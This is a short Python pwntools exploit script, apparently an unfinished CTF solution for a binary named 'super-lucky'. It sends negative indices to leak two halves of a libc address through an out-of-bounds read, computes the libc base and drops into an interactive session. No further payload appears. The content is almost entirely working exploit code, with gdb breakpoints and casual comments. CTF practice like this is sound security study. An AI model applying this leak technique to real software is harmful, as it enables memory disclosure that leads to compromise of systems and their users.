#!/usr/bin/env python3

from pwn import *

exe = ELF("super-lucky_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-2.28.so")

p = process([exe.path])
def GDB():
    context.terminal = ["foot"]
    gdb.attach(p, gdbscript='''
    b*0x00000000004012ca
    b*0x0000000000401352


           ''')
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
def convert(value):
    #this function will convert int to unsigned int
    converted = value + (1 << 32)
    return converted 
# pwning lmao lmao dark bruh
def main():
    GDB()
    sla(b"Take your pick 0-777:",b"-36")
    p.recvuntil(b"Here's lucky number #1: ")
    part1 = hex(convert(int(p.recvuntil(b"\n",drop=True)))).encode("UTF-8")[2:]
    # log.info(f"part1: "+hex(part1))
    sl(b"-35")
    p.recvuntil(b"Here's lucky number #2: ")
    part2 = hex(int(p.recvuntil(b"\n",drop=True))).encode("UTF-8")
    # log.info(f"part2: " + part2)
    leak_libc = int(part2+part1,16)
    libc_base = leak_libc - 0xea300
    log.info(f"leak_libc: "+hex(leak_libc))
    sl(b"3241")
    # sl(b"3241")
    # sl(b"3241")
    # sl(b"3241")
    # sl(b"3241")





















    p.interactive()


if __name__ == "__main__":
    main()
